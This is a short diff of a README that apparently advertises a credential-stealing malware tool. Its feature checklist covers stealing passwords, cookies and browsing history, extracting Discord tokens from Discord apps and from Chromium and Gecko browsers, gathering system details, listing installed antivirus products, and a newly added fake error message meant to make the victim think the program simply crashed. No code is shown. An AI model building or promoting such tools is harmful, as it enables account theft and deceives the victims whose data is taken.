@@ -119,9 +119,9 @@ $persistence = $true
   - 🔑 Passwords
   - 🍪 Cookies
   - 📜 History
-- [x] Extracts [Discord](https://discord.com) Token
+- [x] Extracts [Discord](https://discord.com) tokens from Discord applications, `Chromium browsers` and `Gecko browsers`.
 - [x] Get System Information (Version, CPU, DISK, GPU, RAM, IP, Installed Apps etc.)
-- [x] List of Installed Applications
+- [x] Fake Error: Tricks the user into thinking that the program closed due to an error.
 - [x] List of Installed Antiviruses
 - [x] List of all Network Adapters
 - [x] List of Apps that Run On Startup
